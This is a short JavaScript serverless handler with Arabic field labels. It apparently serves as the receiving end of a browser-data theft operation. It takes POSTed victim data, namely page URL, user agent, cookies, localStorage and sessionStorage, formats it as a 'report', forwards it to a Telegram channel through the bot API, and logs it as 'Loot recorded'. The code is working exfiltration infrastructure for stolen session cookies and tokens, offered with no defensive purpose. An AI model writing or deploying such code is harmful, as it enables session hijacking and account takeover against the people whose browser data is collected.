export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const data = req.body;
  const readable = `
🔐 تقرير جديد – ${new Date().toLocaleString('ar-EG')}
━━━━━━━━━━━━━━━━━━━━
الرابط: ${data.رابط}
الوكيل: ${data.وكيل}
التوقيت: ${data.وقت}
الكوكيز: ${JSON.stringify(data.كوكيز)}
المحلي: ${JSON.stringify(data.محلي)}
الجلسة: ${JSON.stringify(data.جلسة)}
━━━━━━━━━━━━━━━━━━━━
  `;

  // ✅ إرسال إلى القناة باستخدام Channel ID
  const url = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;

  try {
    const reply = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text: readable })
    });
    const result = await reply.json();
    if (!result.ok) console.error('❌ Telegram error:', result);
    else console.log('✅ Telegram sent, message_id:', result.result.message_id);
  } catch (e) {
    console.error('❌ Network error:', e);
  }

  console.log('🔥 Loot recorded:', JSON.stringify(data, null, 2));
  res.status(204).end();
}
